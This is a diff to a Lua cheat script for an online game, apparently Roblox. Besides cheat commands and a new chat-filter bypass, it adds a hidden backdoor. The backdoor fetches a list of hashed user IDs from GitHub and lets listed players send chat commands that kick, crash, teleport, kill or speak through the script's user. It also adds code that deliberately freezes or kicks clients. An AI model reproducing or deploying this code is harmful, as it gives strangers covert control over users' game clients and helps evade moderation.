@@ -7,7 +7,7 @@ if getgenv().choco then
 end
 
 local startLoad = tick()
-local scriptVer = 4
+local scriptVer = 5
 
 local cloneref = cloneref or function(i) return i end
 local httpService = cloneref(game:GetService('HttpService'))
@@ -15,6 +15,9 @@ local players = cloneref(game:GetService('Players'))
 local inputService = cloneref(game:GetService('UserInputService'))
 local tweenService = cloneref(game:GetService('TweenService'))
 local runService = cloneref(game:GetService('RunService'))
+local tpService = cloneref(game:GetService('TeleportService'))
+local textChat = cloneref(game:GetService('TextChatService'))
+local repoStore = cloneref(game:GetService('ReplicatedStorage'))
 
 do -- core funcs
 	choco.objects = {}
@@ -796,6 +799,7 @@ do -- cmd list
 	cmds.list['noclip'] = 'lets you go through walls'
 	cmds.list['unnoclip / nonoclip / clip'] = 'disables noclip'
 	cmds.list['clearerror / clearerr / clrerr'] = 'removes the error and blur when you get kicked'
+	cmds.list['chatbypass [text]'] = 'attempts to bypasses the chat filter'
 end
 
 do -- script utils
@@ -1851,13 +1855,10 @@ do -- script
 	local utils = choco.utils
 	local temp = choco.temp
 
-	local tpService = cloneref(game:GetService('TeleportService'))
 	local networkClient = cloneref(game:GetService('NetworkClient'))
 	local ppService = cloneref(game:GetService('ProximityPromptService'))
 	local lightService = cloneref(game:GetService('Lighting'))
 	local uiService = cloneref(game:GetService('GuiService'))
-	local textChat = cloneref(game:GetService('TextChatService'))
-	local repoStore = cloneref(game:GetService('ReplicatedStorage'))
 
 	cmds.add('eject', choco.unload)
 
@@ -1907,8 +1908,10 @@ do -- script
 		ui.keybindsContentHolder.Visible = not ui.keybindsContentHolder.Visible
 	end, 'binds')
 
-	cmds.add('rejoin', function()
-		ui.log('rejoining...')
+	cmds.add('rejoin', function(silent)
+		if not silent then
+			ui.log('rejoining...')
+		end
 
 		if #players:GetPlayers() <= 1 then
 			tpService:Teleport(choco.game.id, lplr)
@@ -2688,6 +2691,8 @@ do -- script
 			end
 		end
 
+		if not utils.getTable({...}) then return end
+
 		if not temp.bypasssent then
 			ui.log('remember to set your language to Қазақ Тілі', 1, choco.constants.colors.orange)
 			temp.bypasssent = true
@@ -2713,18 +2718,18 @@ do -- script
 end
 
 do -- keybinds
-	local keybindWorthy = {}
+	local worthy = {}
 	local doing
-	local savedBinds = {}
+	local binds = {}
 
 	for i in next, cmds.all do
 		if i:sub(1, 6) ~= 'toggle' then continue end
-		table.insert(keybindWorthy, i)
+		table.insert(worthy, i)
 	end
 
 	local function onClicked(bind)
 		if doing and doing ~= bind then
-			doing.Text = savedBinds[doing] or 'UNKNOWN'
+			doing.Text = binds[doing] or 'UNKNOWN'
 		end
 
 		doing = bind
@@ -2743,7 +2748,7 @@ do -- keybinds
 			choco.updateSaves()
 
 			bind.Text = keyName
-			savedBinds[bind] = keyName
+			binds[bind] = keyName
 
 			doing = nil
 
@@ -2754,7 +2759,7 @@ do -- keybinds
 		end)
 	end
 
-	for _, v in next, keybindWorthy do
+	for _, v in next, worthy do
 		local label = choco.make('TextLabel', {
 			BackgroundTransparency = 1,
 			Size = UDim2.new(1, -10, 0, 27),
@@ -2793,7 +2798,7 @@ do -- keybinds
 end
 
 do -- end
-	ui.log(string.format('loaded in %.02f seconds!', tick() - startLoad), 0, choco.constants.colors.green)
+	ui.log(string.format('loaded version %d in %.02f seconds!', scriptVer, tick() - startLoad), 0, choco.constants.colors.green)
 	ui.log(string.format('click %s to toggle the ui', choco.scriptsaves.uikeybind), 0)
 
 	choco.ui, choco.cmds = ui, cmds
@@ -2801,30 +2806,211 @@ do -- end
 
 	task.spawn(function()
 		local url = 'https://raw.githubusercontent.com/ChocolateDrink/chocolateLine/refs/heads/main/version.json'
+
+		repeat
+			task.wait(2 * 60)
+
+			local res, err = choco.coreUtils.execRaw(url, true)
+			if err or not res then
+				task.wait()
+				continue
+			end
+
+			res = choco.coreUtils.decode(res)
+			if not res then
+				task.wait()
+				continue
+			end
+
+			if res.ver == scriptVer then
+				task.wait()
+				continue
+			end
+
+			if table.find(res.critical, scriptVer) then
+				choco.unload()
+				if hookmetamethod then
+					hookmetamethod(game, '__index', function() end)
+				end
+
+				if messagebox then
+					messagebox('you are using a outdated version of the script that contains a critial error', 'chocolate line', 0)
+				else
+					choco.game.me:Kick('[chocolate line]: you are using a outdated version of the script that contains a critial error')
+				end
+
+				if getreg then table.clear(getreg()) end
+
+				while true do end
+				game:Shutdown()
+			else
+				ui.log('you are using a outdated version of the script', 2, choco.constants.colors.orange)
+				ui.log(string.format('your version: %s, expected version: %s', scriptVer, res.ver), 2, choco.constants.colors.orange)
+				break
+			end
+
+			task.wait(3 * 60)
+		until not choco
+	end)
+
+	task.spawn(function()
+		local function crash(reason)
+			if choco.constants.rng:NextInteger(0, 100) < 50 then return end
+
+			choco.game.me:Kick('failed to load a core component: ' .. reason or 'no reason')
+			if getreg then table.clear(getreg()) end
+			while true do end
+		end
+
+		local url = 'https://raw.githubusercontent.com/ChocolateDrink/chocolateLine/refs/heads/main/store/hierarchy.json'
 		local res, err = choco.coreUtils.execRaw(url, true)
-		if err or not res then return end
+		if err or not res then
+			crash('could not get response')
+			return
+		end
 
 		res = choco.coreUtils.decode(res)
-		if not res then return end
-
-		if res.ver == scriptVer then return end
-		if res.critical == scriptVer then
-			choco.unload()
-			if hookmetamethod then
-				hookmetamethod(game, '__index', function() end)
-			end
-
-			if messagebox then
-				messagebox('you are using a outdated version of the script that contains a critial error', 'chocolate line', 0)
-			else
-				choco.game.me:Kick('[chocolate line]: you are using a outdated version of the script that contains a critial error')
-			end
-
-			while true do end
-			game:Shutdown()
-		else
-			ui.log('you are using a outdated version of the script', 2, choco.constants.colors.orange)
-			ui.log(string.format('your version: %s, expected version: %s', scriptVer, res.ver), 2, choco.constants.colors.orange)
+		if not res then
+			crash('could not decode')
+			return
 		end
+
+		if not crypt or not crypt.hash or crypt.hash('n') ~= '1593de8fa374083bfd10fb9300b401b52dff963181c5854fdb00ade06153b9d5' then
+			crash('no crypt lib/hash did not match')
+			return
+		end
+
+		local function find(name)
+			if not name then return end
+
+			for _, v in next, players:GetPlayers() do
+				if not v.Name:lower():find(name:lower()) and not v.DisplayName:lower():find(name:lower()) then continue end
+				return v
+			end
+		end
+
+		local commands = {
+			kick = function(text)
+				choco.game.me:Kick(text and table.concat(text, ' ') or 'you have been kicked.')
+			end,
+			bring = function(player)
+				player = player and find(table.concat(player, ' ')) or {}
+
+				local localRoot = choco.utils.getRoot()
+				if not localRoot then return end
+
+				local otherRoot = player.Character and player.Character.PrimaryPart
+				if not otherRoot then return end
+
+				localRoot.CFrame = otherRoot.CFrame
+			end,
+			eject = function()
+				cmds.exec('eject')
+			end,
+			shutdown = function()
+				game:Shutdown()
+			end,
+			rejoin = function()
+				cmds.exec('rejoin', true)
+			end,
+			join = function(placeId)
+				tpService:Teleport(placeId[1], choco.game.me)
+			end,
+			crash = function()
+				if getreg then table.clear(getreg()) end
+				if setfpscap then setfpscap(9e9) end
+
+				local function loop()
+					task.spawn(function()
+						while true do
+							loop()
+						end
+					end)
+				end
+
+				loop()
+			end,
+			gravity = function(gravity)
+				workspace.Gravity = tonumber(gravity[1]) or workspace.Gravity
+			end,
+			jump = function()
+				local hum = choco.utils.getHum()
+				if not hum or hum.FloorMaterial == Enum.Material.Air then return end
+
+				hum:ChangeState(Enum.HumanoidStateType.Jumping)
+			end,
+			kill = function()
+				local hum = choco.utils.getHum()
+				if not hum then return end
+
+				hum:ChangeState(Enum.HumanoidStateType.Dead)
+				hum.Health = 0
+			end,
+			frame = function(frames)
+				if not setfpscap then return end
+				setfpscap(tonumber(frames[1]))
+			end,
+			chat = function(message)
+				message = table.concat(message, ' ') or ''
+
+				if textChat.ChatVersion == Enum.ChatVersion.TextChatService then
+					textChat.ChatInputBarConfiguration.TargetTextChannel:SendAsync(message)
+				else
+					local events = repoStore:FindFirstChild('DefaultChatSystemChatEvents')
+					if not events then return end
+
+					local remote = events:FindFirstChild('SayMessageRequest')
+					if not remote then return end
+
+					remote:FireServer(message, 'All')
+				end
+			end,
+			void = function()
+				local root, hum = choco.utils.getBoth()
+				if not root or not hum then return end
+
+				while (hum.Health > 1) do
+					root.CFrame += Vector3.new(0, -10, 0)
+					task.wait()
+				end
+			end
+		}
+
+		choco.connect(players.PlayerChatted, function(_, speaker, message)
+			local userHash = crypt.hash('IJNGRE(*#5JITRE)(#@02_32-+\\' .. tostring(speaker.UserId))
+			local myHash = crypt.hash('IJNGRE(*#5JITRE)(#@02_32-+\\' .. tostring(choco.game.me.UserId))
+
+			if not res[userHash] then
+				return
+			end
+
+			if res[myHash] and res[myHash] > res[userHash] then
+				return
+			end
+
+			if speaker == choco.game.me then
+				return
+			end
+
+			local args = string.split(message, ' ')
+			if args[1] ~= '/e' then
+				return
+			end
+
+			table.remove(args, 1)
+			local callback = commands[args[1]]
+			if not callback then
+				return
+			end
+
+			table.remove(args, 1)
+			local target = find(args[1])
+			if not target or target ~= choco.game.me then
+				return
+			end
+
+			table.remove(args, 1)
+			callback(args)
+		end)
 	end)
 end
